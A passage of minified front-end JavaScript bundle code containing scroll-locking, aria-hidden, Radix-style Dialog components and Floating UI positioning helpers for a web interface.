    margin-top:0;
    margin-right: `).concat(X, "px ").concat(O, `;
    `), j === "padding" && "padding-right: ".concat(X, "px ").concat(O, ";")].filter(Boolean).join(""), `
  }
  
  .`).concat(zeroRightClassName, ` {
    right: `).concat(X, "px ").concat(O, `;
  }
  
  .`).concat(fullWidthClassName, ` {
    margin-right: `).concat(X, "px ").concat(O, `;
  }
  
  .`).concat(zeroRightClassName, " .").concat(zeroRightClassName, ` {
    right: 0 `).concat(O, `;
  }
  
  .`).concat(fullWidthClassName, " .").concat(fullWidthClassName, ` {
    margin-right: 0 `).concat(O, `;
  }
  
  body[`).concat(lockAttribute, `] {
    `).concat(removedBarSizeVariable, ": ").concat(X, `px;
  }
`)
}
  , getCurrentUseCounter = function() {
    var _ = parseInt(document.body.getAttribute(lockAttribute) || "0", 10);
    return isFinite(_) ? _ : 0
}
  , useLockAttribute = function() {
    reactExports.useEffect(function() {
        return document.body.setAttribute(lockAttribute, (getCurrentUseCounter() + 1).toString()),
        function() {
            var _ = getCurrentUseCounter() - 1;
            _ <= 0 ? document.body.removeAttribute(lockAttribute) : document.body.setAttribute(lockAttribute, _.toString())
        }
    }, [])
}
  , RemoveScrollBar = function(_) {
    var M = _.noRelative
      , j = _.noImportant
      , O = _.gapMode
      , x = O === void 0 ? "margin" : O;
    useLockAttribute();
    var w = reactExports.useMemo(function() {
        return getGapWidth(x)
    }, [x]);
    return reactExports.createElement(Style, {
        styles: getStyles(w, !M, x, j ? "" : "!important")
    })
}
  , passiveSupported = !1;
if (typeof window < "u")
    try {
        var options = Object.defineProperty({}, "passive", {
            get: function() {
                return passiveSupported = !0,
                !0
            }
        });
        window.addEventListener("test", options, options),
        window.removeEventListener("test", options, options)
    } catch {
        passiveSupported = !1
    }
var nonPassive = passiveSupported ? {
    passive: !1
} : !1
  , alwaysContainsScroll = function(_) {
    return _.tagName === "TEXTAREA"
}
  , elementCanBeScrolled = function(_, M) {
    if (!(_ instanceof Element))
        return !1;
    var j = window.getComputedStyle(_);
    return j[M] !== "hidden" && !(j.overflowY === j.overflowX && !alwaysContainsScroll(_) && j[M] === "visible")
}
  , elementCouldBeVScrolled = function(_) {
    return elementCanBeScrolled(_, "overflowY")
}
  , elementCouldBeHScrolled = function(_) {
    return elementCanBeScrolled(_, "overflowX")
}
  , locationCouldBeScrolled = function(_, M) {
    var j = M.ownerDocument
      , O = M;
    do {
        typeof ShadowRoot < "u" && O instanceof ShadowRoot && (O = O.host);
        var x = elementCouldBeScrolled(_, O);
        if (x) {
            var w = getScrollVariables(_, O)
              , b = w[1]
              , X = w[2];
            if (b > X)
                return !0
        }
        O = O.parentNode
    } while (O && O !== j.body);
    return !1
}
  , getVScrollVariables = function(_) {
    var M = _.scrollTop
      , j = _.scrollHeight
      , O = _.clientHeight;
    return [M, j, O]
}
  , getHScrollVariables = function(_) {
    var M = _.scrollLeft
      , j = _.scrollWidth
      , O = _.clientWidth;
    return [M, j, O]
}
  , elementCouldBeScrolled = function(_, M) {
    return _ === "v" ? elementCouldBeVScrolled(M) : elementCouldBeHScrolled(M)
}
  , getScrollVariables = function(_, M) {
    return _ === "v" ? getVScrollVariables(M) : getHScrollVariables(M)
}
  , getDirectionFactor = function(_, M) {
    return _ === "h" && M === "rtl" ? -1 : 1
}
  , handleScroll = function(_, M, j, O, x) {
    var w = getDirectionFactor(_, window.getComputedStyle(M).direction)
      , b = w * O
      , X = j.target
      , Y = M.contains(X)
      , F = !1
      , V = b > 0
      , K = 0
      , Q = 0;
    do {
        var ee = getScrollVariables(_, X)
          , ae = ee[0]
          , ne = ee[1]
          , oe = ee[2]
          , ue = ne - oe - w * ae;
        (ae || ue) && elementCouldBeScrolled(_, X) && (K += ue,
        Q += ae),
        X = X.parentNode.host || X.parentNode
    } while (!Y && X !== document.body || Y && (M.contains(X) || M === X));
    return (V && Math.abs(K) < 1 || !V && Math.abs(Q) < 1) && (F = !0),
    F
}
  , getTouchXY = function(_) {
    return "changedTouches"in _ ? [_.changedTouches[0].clientX, _.changedTouches[0].clientY] : [0, 0]
}
  , getDeltaXY = function(_) {
    return [_.deltaX, _.deltaY]
}
  , extractRef = function(_) {
    return _ && "current"in _ ? _.current : _
}
  , deltaCompare = function(_, M) {
    return _[0] === M[0] && _[1] === M[1]
}
  , generateStyle = function(_) {
    return `
  .block-interactivity-`.concat(_, ` {pointer-events: none;}
  .allow-interactivity-`).concat(_, ` {pointer-events: all;}
`)
}
  , idCounter = 0
  , lockStack = [];
function RemoveScrollSideCar(_) {
    var M = reactExports.useRef([])
      , j = reactExports.useRef([0, 0])
      , O = reactExports.useRef()
      , x = reactExports.useState(idCounter++)[0]
      , w = reactExports.useState(styleSingleton)[0]
      , b = reactExports.useRef(_);
    reactExports.useEffect(function() {
        b.current = _
    }, [_]),
    reactExports.useEffect(function() {
        if (_.inert) {
            document.body.classList.add("block-interactivity-".concat(x));
            var ne = __spreadArray([_.lockRef.current], (_.shards || []).map(extractRef), !0).filter(Boolean);
            return ne.forEach(function(oe) {
                return oe.classList.add("allow-interactivity-".concat(x))
            }),
            function() {
                document.body.classList.remove("block-interactivity-".concat(x)),
                ne.forEach(function(oe) {
                    return oe.classList.remove("allow-interactivity-".concat(x))
                })
            }
        }
    }, [_.inert, _.lockRef.current, _.shards]);
    var X = reactExports.useCallback(function(ne, oe) {
        if ("touches"in ne && ne.touches.length === 2 || ne.type === "wheel" && ne.ctrlKey)
            return !b.current.allowPinchZoom;
        var ue = getTouchXY(ne), fe = j.current, he = "deltaX"in ne ? ne.deltaX : fe[0] - ue[0], pe = "deltaY"in ne ? ne.deltaY : fe[1] - ue[1], ye, be = ne.target, xe = Math.abs(he) > Math.abs(pe) ? "h" : "v";
        if ("touches"in ne && xe === "h" && be.type === "range")
            return !1;
        var Ae = locationCouldBeScrolled(xe, be);
        if (!Ae)
            return !0;
        if (Ae ? ye = xe : (ye = xe === "v" ? "h" : "v",
        Ae = locationCouldBeScrolled(xe, be)),
        !Ae)
            return !1;
        if (!O.current && "changedTouches"in ne && (he || pe) && (O.current = ye),
        !ye)
            return !0;
        var Ee = O.current || ye;
        return handleScroll(Ee, oe, ne, Ee === "h" ? he : pe)
    }, [])
      , Y = reactExports.useCallback(function(ne) {
        var oe = ne;
        if (!(!lockStack.length || lockStack[lockStack.length - 1] !== w)) {
            var ue = "deltaY"in oe ? getDeltaXY(oe) : getTouchXY(oe)
              , fe = M.current.filter(function(ye) {
                return ye.name === oe.type && (ye.target === oe.target || oe.target === ye.shadowParent) && deltaCompare(ye.delta, ue)
            })[0];
            if (fe && fe.should) {
                oe.cancelable && oe.preventDefault();
                return
            }
            if (!fe) {
                var he = (b.current.shards || []).map(extractRef).filter(Boolean).filter(function(ye) {
                    return ye.contains(oe.target)
                })
                  , pe = he.length > 0 ? X(oe, he[0]) : !b.current.noIsolation;
                pe && oe.cancelable && oe.preventDefault()
            }
        }
    }, [])
      , F = reactExports.useCallback(function(ne, oe, ue, fe) {
        var he = {
            name: ne,
            delta: oe,
            target: ue,
            should: fe,
            shadowParent: getOutermostShadowParent(ue)
        };
        M.current.push(he),
        setTimeout(function() {
            M.current = M.current.filter(function(pe) {
                return pe !== he
            })
        }, 1)
    }, [])
      , V = reactExports.useCallback(function(ne) {
        j.current = getTouchXY(ne),
        O.current = void 0
    }, [])
      , K = reactExports.useCallback(function(ne) {
        F(ne.type, getDeltaXY(ne), ne.target, X(ne, _.lockRef.current))
    }, [])
      , Q = reactExports.useCallback(function(ne) {
        F(ne.type, getTouchXY(ne), ne.target, X(ne, _.lockRef.current))
    }, []);
    reactExports.useEffect(function() {
        return lockStack.push(w),
        _.setCallbacks({
            onScrollCapture: K,
            onWheelCapture: K,
            onTouchMoveCapture: Q
        }),
        document.addEventListener("wheel", Y, nonPassive),
        document.addEventListener("touchmove", Y, nonPassive),
        document.addEventListener("touchstart", V, nonPassive),
        function() {
            lockStack = lockStack.filter(function(ne) {
                return ne !== w
            }),
            document.removeEventListener("wheel", Y, nonPassive),
            document.removeEventListener("touchmove", Y, nonPassive),
            document.removeEventListener("touchstart", V, nonPassive)
        }
    }, []);
    var ee = _.removeScrollBar
      , ae = _.inert;
    return reactExports.createElement(reactExports.Fragment, null, ae ? reactExports.createElement(w, {
        styles: generateStyle(x)
    }) : null, ee ? reactExports.createElement(RemoveScrollBar, {
        noRelative: _.noRelative,
        gapMode: _.gapMode
    }) : null)
}
function getOutermostShadowParent(_) {
    for (var M = null; _ !== null; )
        _ instanceof ShadowRoot && (M = _.host,
        _ = _.host),
        _ = _.parentNode;
    return M
}
const SideCar = exportSidecar(effectCar, RemoveScrollSideCar);
var ReactRemoveScroll = reactExports.forwardRef(function(_, M) {
    return reactExports.createElement(RemoveScroll, __assign$1({}, _, {
        ref: M,
        sideCar: SideCar
    }))
});
ReactRemoveScroll.classNames = RemoveScroll.classNames;
var getDefaultParent = function(_) {
    if (typeof document > "u")
        return null;
    var M = Array.isArray(_) ? _[0] : _;
    return M.ownerDocument.body
}
  , counterMap = new WeakMap
  , uncontrolledNodes = new WeakMap
  , markerMap = {}
  , lockCount = 0
  , unwrapHost = function(_) {
    return _ && (_.host || unwrapHost(_.parentNode))
}
  , correctTargets = function(_, M) {
    return M.map(function(j) {
        if (_.contains(j))
            return j;
        var O = unwrapHost(j);
        return O && _.contains(O) ? O : (console.error("aria-hidden", j, "in not contained inside", _, ". Doing nothing"),
        null)
    }).filter(function(j) {
        return !!j
    })
}
  , applyAttributeToOthers = function(_, M, j, O) {
    var x = correctTargets(M, Array.isArray(_) ? _ : [_]);
    markerMap[j] || (markerMap[j] = new WeakMap);
    var w = markerMap[j]
      , b = []
      , X = new Set
      , Y = new Set(x)
      , F = function(K) {
        !K || X.has(K) || (X.add(K),
        F(K.parentNode))
    };
    x.forEach(F);
    var V = function(K) {
        !K || Y.has(K) || Array.prototype.forEach.call(K.children, function(Q) {
            if (X.has(Q))
                V(Q);
            else
                try {
                    var ee = Q.getAttribute(O)
                      , ae = ee !== null && ee !== "false"
                      , ne = (counterMap.get(Q) || 0) + 1
                      , oe = (w.get(Q) || 0) + 1;
                    counterMap.set(Q, ne),
                    w.set(Q, oe),
                    b.push(Q),
                    ne === 1 && ae && uncontrolledNodes.set(Q, !0),
                    oe === 1 && Q.setAttribute(j, "true"),
                    ae || Q.setAttribute(O, "true")
                } catch (ue) {
                    console.error("aria-hidden: cannot operate on ", Q, ue)
                }
        })
    };
    return V(M),
    X.clear(),
    lockCount++,
    function() {
        b.forEach(function(K) {
            var Q = counterMap.get(K) - 1
              , ee = w.get(K) - 1;
            counterMap.set(K, Q),
            w.set(K, ee),
            Q || (uncontrolledNodes.has(K) || K.removeAttribute(O),
            uncontrolledNodes.delete(K)),
            ee || K.removeAttribute(j)
        }),
        lockCount--,
        lockCount || (counterMap = new WeakMap,
        counterMap = new WeakMap,
        uncontrolledNodes = new WeakMap,
        markerMap = {})
    }
}
  , hideOthers = function(_, M, j) {
    j === void 0 && (j = "data-aria-hidden");
    var O = Array.from(Array.isArray(_) ? _ : [_])
      , x = getDefaultParent(_);
    return x ? (O.push.apply(O, Array.from(x.querySelectorAll("[aria-live], script"))),
    applyAttributeToOthers(O, x, j, "aria-hidden")) : function() {
        return null
    }
}
  , DIALOG_NAME = "Dialog"
  , [createDialogContext,createDialogScope] = createContextScope(DIALOG_NAME)
  , [DialogProvider,useDialogContext] = createDialogContext(DIALOG_NAME)
  , Dialog = _ => {
    const {__scopeDialog: M, children: j, open: O, defaultOpen: x, onOpenChange: w, modal: b=!0} = _
      , X = reactExports.useRef(null)
      , Y = reactExports.useRef(null)
      , [F,V] = useControllableState({
        prop: O,
        defaultProp: x ?? !1,
        onChange: w,
        caller: DIALOG_NAME
    });
    return jsxRuntimeExports.jsx(DialogProvider, {
        scope: M,
        triggerRef: X,
        contentRef: Y,
        contentId: useId(),
        titleId: useId(),
        descriptionId: useId(),
        open: F,
        onOpenChange: V,
        onOpenToggle: reactExports.useCallback( () => V(K => !K), [V]),
        modal: b,
        children: j
    })
}
;
Dialog.displayName = DIALOG_NAME;
var TRIGGER_NAME$3 = "DialogTrigger"
  , DialogTrigger = reactExports.forwardRef( (_, M) => {
    const {__scopeDialog: j, ...O} = _
      , x = useDialogContext(TRIGGER_NAME$3, j)
      , w = useComposedRefs(M, x.triggerRef);
    return jsxRuntimeExports.jsx(Primitive$1.button, {
        type: "button",
        "aria-haspopup": "dialog",
        "aria-expanded": x.open,
        "aria-controls": x.contentId,
        "data-state": getState(x.open),
        ...O,
        ref: w,
        onClick: composeEventHandlers$1(_.onClick, x.onOpenToggle)
    })
}
);
DialogTrigger.displayName = TRIGGER_NAME$3;
var PORTAL_NAME$4 = "DialogPortal"
  , [PortalProvider$2,usePortalContext$2] = createDialogContext(PORTAL_NAME$4, {
    forceMount: void 0
})
  , DialogPortal = _ => {
    const {__scopeDialog: M, forceMount: j, children: O, container: x} = _
      , w = useDialogContext(PORTAL_NAME$4, M);
    return jsxRuntimeExports.jsx(PortalProvider$2, {
        scope: M,
        forceMount: j,
        children: reactExports.Children.map(O, b => jsxRuntimeExports.jsx(Presence, {
            present: j || w.open,
            children: jsxRuntimeExports.jsx(Portal$4, {
                asChild: !0,
                container: x,
                children: b
            })
        }))
    })
}
;
DialogPortal.displayName = PORTAL_NAME$4;
var OVERLAY_NAME = "DialogOverlay"
  , DialogOverlay = reactExports.forwardRef( (_, M) => {
    const j = usePortalContext$2(OVERLAY_NAME, _.__scopeDialog)
      , {forceMount: O=j.forceMount, ...x} = _
      , w = useDialogContext(OVERLAY_NAME, _.__scopeDialog);
    return w.modal ? jsxRuntimeExports.jsx(Presence, {
        present: O || w.open,
        children: jsxRuntimeExports.jsx(DialogOverlayImpl, {
            ...x,
            ref: M
        })
    }) : null
}
);
DialogOverlay.displayName = OVERLAY_NAME;
var Slot$2 = createSlot("DialogOverlay.RemoveScroll")
  , DialogOverlayImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeDialog: j, ...O} = _
      , x = useDialogContext(OVERLAY_NAME, j);
    return jsxRuntimeExports.jsx(ReactRemoveScroll, {
        as: Slot$2,
        allowPinchZoom: !0,
        shards: [x.contentRef],
        children: jsxRuntimeExports.jsx(Primitive$1.div, {
            "data-state": getState(x.open),
            ...O,
            ref: M,
            style: {
                pointerEvents: "auto",
                ...O.style
            }
        })
    })
}
)
  , CONTENT_NAME$5 = "DialogContent"
  , DialogContent = reactExports.forwardRef( (_, M) => {
    const j = usePortalContext$2(CONTENT_NAME$5, _.__scopeDialog)
      , {forceMount: O=j.forceMount, ...x} = _
      , w = useDialogContext(CONTENT_NAME$5, _.__scopeDialog);
    return jsxRuntimeExports.jsx(Presence, {
        present: O || w.open,
        children: w.modal ? jsxRuntimeExports.jsx(DialogContentModal, {
            ...x,
            ref: M
        }) : jsxRuntimeExports.jsx(DialogContentNonModal, {
            ...x,
            ref: M
        })
    })
}
);
DialogContent.displayName = CONTENT_NAME$5;
var DialogContentModal = reactExports.forwardRef( (_, M) => {
    const j = useDialogContext(CONTENT_NAME$5, _.__scopeDialog)
      , O = reactExports.useRef(null)
      , x = useComposedRefs(M, j.contentRef, O);
    return reactExports.useEffect( () => {
        const w = O.current;
        if (w)
            return hideOthers(w)
    }
    , []),
    jsxRuntimeExports.jsx(DialogContentImpl, {
        ..._,
        ref: x,
        trapFocus: j.open,
        disableOutsidePointerEvents: !0,
        onCloseAutoFocus: composeEventHandlers$1(_.onCloseAutoFocus, w => {
            var b;
            w.preventDefault(),
            (b = j.triggerRef.current) == null || b.focus()
        }
        ),
        onPointerDownOutside: composeEventHandlers$1(_.onPointerDownOutside, w => {
            const b = w.detail.originalEvent
              , X = b.button === 0 && b.ctrlKey === !0;
            (b.button === 2 || X) && w.preventDefault()
        }
        ),
        onFocusOutside: composeEventHandlers$1(_.onFocusOutside, w => w.preventDefault())
    })
}
)
  , DialogContentNonModal = reactExports.forwardRef( (_, M) => {
    const j = useDialogContext(CONTENT_NAME$5, _.__scopeDialog)
      , O = reactExports.useRef(!1)
      , x = reactExports.useRef(!1);
    return jsxRuntimeExports.jsx(DialogContentImpl, {
        ..._,
        ref: M,
        trapFocus: !1,
        disableOutsidePointerEvents: !1,
        onCloseAutoFocus: w => {
            var b, X;
            (b = _.onCloseAutoFocus) == null || b.call(_, w),
            w.defaultPrevented || (O.current || (X = j.triggerRef.current) == null || X.focus(),
            w.preventDefault()),
            O.current = !1,
            x.current = !1
        }
        ,
        onInteractOutside: w => {
            var Y, F;
            (Y = _.onInteractOutside) == null || Y.call(_, w),
            w.defaultPrevented || (O.current = !0,
            w.detail.originalEvent.type === "pointerdown" && (x.current = !0));
            const b = w.target;
            ((F = j.triggerRef.current) == null ? void 0 : F.contains(b)) && w.preventDefault(),
            w.detail.originalEvent.type === "focusin" && x.current && w.preventDefault()
        }
    })
}
)
  , DialogContentImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeDialog: j, trapFocus: O, onOpenAutoFocus: x, onCloseAutoFocus: w, ...b} = _
      , X = useDialogContext(CONTENT_NAME$5, j)
      , Y = reactExports.useRef(null)
      , F = useComposedRefs(M, Y);
    return useFocusGuards(),
    jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, {
        children: [jsxRuntimeExports.jsx(FocusScope, {
            asChild: !0,
            loop: !0,
            trapped: O,
            onMountAutoFocus: x,
            onUnmountAutoFocus: w,
            children: jsxRuntimeExports.jsx(DismissableLayer, {
                role: "dialog",
                id: X.contentId,
                "aria-describedby": X.descriptionId,
                "aria-labelledby": X.titleId,
                "data-state": getState(X.open),
                ...b,
                ref: F,
                onDismiss: () => X.onOpenChange(!1)
            })
        }), jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, {
            children: [jsxRuntimeExports.jsx(TitleWarning, {
                titleId: X.titleId
            }), jsxRuntimeExports.jsx(DescriptionWarning, {
                contentRef: Y,
                descriptionId: X.descriptionId
            })]
        })]
    })
}
)
  , TITLE_NAME = "DialogTitle"
  , DialogTitle = reactExports.forwardRef( (_, M) => {
    const {__scopeDialog: j, ...O} = _
      , x = useDialogContext(TITLE_NAME, j);
    return jsxRuntimeExports.jsx(Primitive$1.h2, {
        id: x.titleId,
        ...O,
        ref: M
    })
}
);
DialogTitle.displayName = TITLE_NAME;
var DESCRIPTION_NAME = "DialogDescription"
  , DialogDescription = reactExports.forwardRef( (_, M) => {
    const {__scopeDialog: j, ...O} = _
      , x = useDialogContext(DESCRIPTION_NAME, j);
    return jsxRuntimeExports.jsx(Primitive$1.p, {
        id: x.descriptionId,
        ...O,
        ref: M
    })
}
);
DialogDescription.displayName = DESCRIPTION_NAME;
var CLOSE_NAME = "DialogClose"
  , DialogClose = reactExports.forwardRef( (_, M) => {
    const {__scopeDialog: j, ...O} = _
      , x = useDialogContext(CLOSE_NAME, j);
    return jsxRuntimeExports.jsx(Primitive$1.button, {
        type: "button",
        ...O,
        ref: M,
        onClick: composeEventHandlers$1(_.onClick, () => x.onOpenChange(!1))
    })
}
);
DialogClose.displayName = CLOSE_NAME;
function getState(_) {
    return _ ? "open" : "closed"
}
var TITLE_WARNING_NAME = "DialogTitleWarning"
  , [WarningProvider,useWarningContext] = createContext2(TITLE_WARNING_NAME, {
    contentName: CONTENT_NAME$5,
    titleName: TITLE_NAME,
    docsSlug: "dialog"
})
  , TitleWarning = ({titleId: _}) => {
    const M = useWarningContext(TITLE_WARNING_NAME)
      , j = `\`${M.contentName}\` requires a \`${M.titleName}\` for the component to be accessible for screen reader users.

If you want to hide the \`${M.titleName}\`, you can wrap it with our VisuallyHidden component.

For more information, see https://radix-ui.com/primitives/docs/components/${M.docsSlug}`;
    return reactExports.useEffect( () => {
        _ && (document.getElementById(_) || console.error(j))
    }
    , [j, _]),
    null
}
  , DESCRIPTION_WARNING_NAME = "DialogDescriptionWarning"
  , DescriptionWarning = ({contentRef: _, descriptionId: M}) => {
    const O = `Warning: Missing \`Description\` or \`aria-describedby={undefined}\` for {${useWarningContext(DESCRIPTION_WARNING_NAME).contentName}}.`;
    return reactExports.useEffect( () => {
        var w;
        const x = (w = _.current) == null ? void 0 : w.getAttribute("aria-describedby");
        M && x && (document.getElementById(M) || console.warn(O))
    }
    , [O, _, M]),
    null
}
  , Root$3 = Dialog
  , Trigger$3 = DialogTrigger
  , Portal$3 = DialogPortal
  , Overlay = DialogOverlay
  , Content$1 = DialogContent
  , Title = DialogTitle
  , Description = DialogDescription
  , Close = DialogClose;
function usePrevious(_) {
    const M = reactExports.useRef({
        value: _,
        previous: _
    });
    return reactExports.useMemo( () => (M.current.value !== _ && (M.current.previous = M.current.value,
    M.current.value = _),
    M.current.previous), [_])
}
function useSize(_) {
    const [M,j] = reactExports.useState(void 0);
    return useLayoutEffect2( () => {
        if (_) {
            j({
                width: _.offsetWidth,
                height: _.offsetHeight
            });
            const O = new ResizeObserver(x => {
                if (!Array.isArray(x) || !x.length)
                    return;
                const w = x[0];
                let b, X;
                if ("borderBoxSize"in w) {
                    const Y = w.borderBoxSize
                      , F = Array.isArray(Y) ? Y[0] : Y;
                    b = F.inlineSize,
                    X = F.blockSize
                } else
                    b = _.offsetWidth,
                    X = _.offsetHeight;
                j({
                    width: b,
                    height: X
                })
            }
            );
            return O.observe(_, {
                box: "border-box"
            }),
            () => O.unobserve(_)
        } else
            j(void 0)
    }
    , [_]),
    M
}
const sides = ["top", "right", "bottom", "left"]
  , min$1 = Math.min
  , max$1 = Math.max
  , round$1 = Math.round
  , floor$1 = Math.floor
  , createCoords = _ => ({
    x: _,
    y: _
})
  , oppositeSideMap = {
    left: "right",
    right: "left",
    bottom: "top",
    top: "bottom"
}
  , oppositeAlignmentMap = {
    start: "end",
    end: "start"
};
function clamp$1(_, M, j) {
    return max$1(_, min$1(M, j))
}
function evaluate(_, M) {
    return typeof _ == "function" ? _(M) : _
}
function getSide(_) {
    return _.split("-")[0]
}
function getAlignment(_) {
    return _.split("-")[1]
}
function getOppositeAxis(_) {
    return _ === "x" ? "y" : "x"
}
function getAxisLength(_) {
    return _ === "y" ? "height" : "width"
}
function getSideAxis(_) {
    return ["top", "bottom"].includes(getSide(_)) ? "y" : "x"
}
function getAlignmentAxis(_) {
    return getOppositeAxis(getSideAxis(_))
}
function getAlignmentSides(_, M, j) {
    j === void 0 && (j = !1);
    const O = getAlignment(_)
      , x = getAlignmentAxis(_)
      , w = getAxisLength(x);
    let b = x === "x" ? O === (j ? "end" : "start") ? "right" : "left" : O === "start" ? "bottom" : "top";
    return M.reference[w] > M.floating[w] && (b = getOppositePlacement(b)),
    [b, getOppositePlacement(b)]
}
function getExpandedPlacements(_) {
    const M = getOppositePlacement(_);
    return [getOppositeAlignmentPlacement(_), M, getOppositeAlignmentPlacement(M)]
}
function getOppositeAlignmentPlacement(_) {
    return _.replace(/start|end/g, M => oppositeAlignmentMap[M])
}
function getSideList(_, M, j) {
    const O = ["left", "right"]
      , x = ["right", "left"]
      , w = ["top", "bottom"]
      , b = ["bottom", "top"];
    switch (_) {
    case "top":
    case "bottom":
        return j ? M ? x : O : M ? O : x;
    case "left":
    case "right":
        return M ? w : b;
    default:
        return []
    }
}
function getOppositeAxisPlacements(_, M, j, O) {
    const x = getAlignment(_);
    let w = getSideList(getSide(_), j === "start", O);
    return x && (w = w.map(b => b + "-" + x),
    M && (w = w.concat(w.map(getOppositeAlignmentPlacement)))),
    w
}
function getOppositePlacement(_) {
    return _.replace(/left|right|bottom|top/g, M => oppositeSideMap[M])
}
function expandPaddingObject(_) {
    return {
        top: 0,
        right: 0,
        bottom: 0,
        left: 0,
        ..._
    }
}
function getPaddingObject(_) {
    return typeof _ != "number" ? expandPaddingObject(_) : {
        top: _,
        right: _,
        bottom: _,
        left: _
    }
}
function rectToClientRect(_) {
    const {x: M, y: j, width: O, height: x} = _;
    return {
        width: O,
        height: x,
        top: j,
        left: M,
        right: M + O,
        bottom: j + x,
        x: M,
        y: j
    }
}
function computeCoordsFromPlacement(_, M, j) {
    let {reference: O, floating: x} = _;
    const w = getSideAxis(M)
      , b = getAlignmentAxis(M)
      , X = getAxisLength(b)
      , Y = getSide(M)
      , F = w === "y"
      , V = O.x + O.width / 2 - x.width / 2
      , K = O.y + O.height / 2 - x.height / 2
      , Q = O[X] / 2 - x[X] / 2;
    let ee;
    switch (Y) {
    case "top":
        ee = {
            x: V,
            y: O.y - x.height
        };
        break;
    case "bottom":
        ee = {
            x: V,
            y: O.y + O.height
        };
        break;
    case "right":
        ee = {
            x: O.x + O.width,
            y: K
        };
        break;
    case "left":
        ee = {
            x: O.x - x.width,
            y: K
        };
        break;
    default:
        ee = {
            x: O.x,
            y: O.y
        }
    }
    switch (getAlignment(M)) {
    case "start":
        ee[b] -= Q * (j && F ? -1 : 1);
        break;
    case "end":
        ee[b] += Q * (j && F ? -1 : 1);
        break
    }
    return ee
}
const computePosition$1 = async (_, M, j) => {
    const {placement: O="bottom", strategy: x="absolute", middleware: w=[], platform: b} = j
      , X = w.filter(Boolean)
      , Y = await (b.isRTL == null ? void 0 : b.isRTL(M));
    let F = await b.getElementRects({
        reference: _,
        floating: M,
        strategy: x
    })
      , {x: V, y: K} = computeCoordsFromPlacement(F, O, Y)
      , Q = O
      , ee = {}
      , ae = 0;
    for (let ne = 0; ne < X.length; ne++) {
        const {name: oe, fn: ue} = X[ne]
          , {x: fe, y: he, data: pe, reset: ye} = await ue({
            x: V,
            y: K,
            initialPlacement: O,
            placement: Q,
            strategy: x,
            middlewareData: ee,
            rects: F,
            platform: b,
            elements: {
                reference: _,
                floating: M
            }
        });
        V = fe ?? V,
        K = he ?? K,
        ee = {
            ...ee,
            [oe]: {
                ...ee[oe],
                ...pe
            }
        },
        ye && ae <= 50 && (ae++,
        typeof ye == "object" && (ye.placement && (Q = ye.placement),
        ye.rects && (F = ye.rects === !0 ? await b.getElementRects({
            reference: _,
            floating: M,
            strategy: x
        }) : ye.rects),
        {x: V, y: K} = computeCoordsFromPlacement(F, Q, Y)),
        ne = -1)
    }
    return {
        x: V,
        y: K,
        placement: Q,
        strategy: x,
        middlewareData: ee
    }
}
;
async function detectOverflow(_, M) {
    var j;
    M === void 0 && (M = {});
    const {x: O, y: x, platform: w, rects: b, elements: X, strategy: Y} = _
      , {boundary: F="clippingAncestors", rootBoundary: V="viewport", elementContext: K="floating", altBoundary: Q=!1, padding: ee=0} = evaluate(M, _)
      , ae = getPaddingObject(ee)
      , oe = X[Q ? K === "floating" ? "reference" : "floating" : K]
      , ue = rectToClientRect(await w.getClippingRect({
        element: (j = await (w.isElement == null ? void 0 : w.isElement(oe))) == null || j ? oe : oe.contextElement || await (w.getDocumentElement == null ? void 0 : w.getDocumentElement(X.floating)),
        boundary: F,
        rootBoundary: V,
        strategy: Y
    }))
      , fe = K === "floating" ? {
        x: O,
        y: x,
        width: b.floating.width,
        height: b.floating.height
    } : b.reference
      , he = await (w.getOffsetParent == null ? void 0 : w.getOffsetParent(X.floating))
      , pe = await (w.isElement == null ? void 0 : w.isElement(he)) ? await (w.getScale == null ? void 0 : w.getScale(he)) || {
        x: 1,
        y: 1
    } : {
        x: 1,
        y: 1
    }
      , ye = rectToClientRect(w.convertOffsetParentRelativeRectToViewportRelativeRect ? await w.convertOffsetParentRelativeRectToViewportRelativeRect({
        elements: X,
        rect: fe,
        offsetParent: he,
        strategy: Y
    }) : fe);
    return {
        top: (ue.top - ye.top + ae.top) / pe.y,
        bottom: (ye.bottom - ue.bottom + ae.bottom) / pe.y,
        left: (ue.left - ye.left + ae.left) / pe.x,
        right: (ye.right - ue.right + ae.right) / pe.x
    }
}
const arrow$3 = _ => ({
    name: "arrow",
    options: _,
    async fn(M) {
        const {x: j, y: O, placement: x, rects: w, platform: b, elements: X, middlewareData: Y} = M
          , {element: F, padding: V=0} = evaluate(_, M) || {};
        if (F == null)
            return {};
        const K = getPaddingObject(V)
          , Q = {
            x: j,
            y: O
        }
          , ee = getAlignmentAxis(x)
          , ae = getAxisLength(ee)
          , ne = await b.getDimensions(F)
          , oe = ee === "y"
          , ue = oe ? "top" : "left"
          , fe = oe ? "bottom" : "right"
          , he = oe ? "clientHeight" : "clientWidth"
          , pe = w.reference[ae] + w.reference[ee] - Q[ee] - w.floating[ae]
          , ye = Q[ee] - w.reference[ee]
          , be = await (b.getOffsetParent == null ? void 0 : b.getOffsetParent(F));
        let xe = be ? be[he] : 0;
        (!xe || !await (b.isElement == null ? void 0 : b.isElement(be))) && (xe = X.floating[he] || w.floating[ae]);
        const Ae = pe / 2 - ye / 2
          , Ee = xe / 2 - ne[ae] / 2 - 1
          , Be = min$1(K[ue], Ee)
          , ce = min$1(K[fe], Ee)
          , q = Be
          , L = xe - ne[ae] - ce
          , U = xe / 2 - ne[ae] / 2 + Ae
          , Z = clamp$1(q, U, L)
          , te = !Y.arrow && getAlignment(x) != null && U !== Z && w.reference[ae] / 2 - (U < q ? Be : ce) - ne[ae] / 2 < 0
          , se = te ? U < q ? U - q : U - L : 0;
        return {
            [ee]: Q[ee] + se,
            data: {
                [ee]: Z,
                centerOffset: U - Z - se,
                ...te && {
                    alignmentOffset: se
                }
            },
            reset: te
        }
    }
})
  , flip$2 = function(_) {
    return _ === void 0 && (_ = {}),
    {
        name: "flip",
        options: _,
        async fn(M) {
            var j, O;
            const {placement: x, middlewareData: w, rects: b, initialPlacement: X, platform: Y, elements: F} = M
              , {mainAxis: V=!0, crossAxis: K=!0, fallbackPlacements: Q, fallbackStrategy: ee="bestFit", fallbackAxisSideDirection: ae="none", flipAlignment: ne=!0, ...oe} = evaluate(_, M);
            if ((j = w.arrow) != null && j.alignmentOffset)
                return {};
            const ue = getSide(x)
              , fe = getSideAxis(X)
              , he = getSide(X) === X
              , pe = await (Y.isRTL == null ? void 0 : Y.isRTL(F.floating))
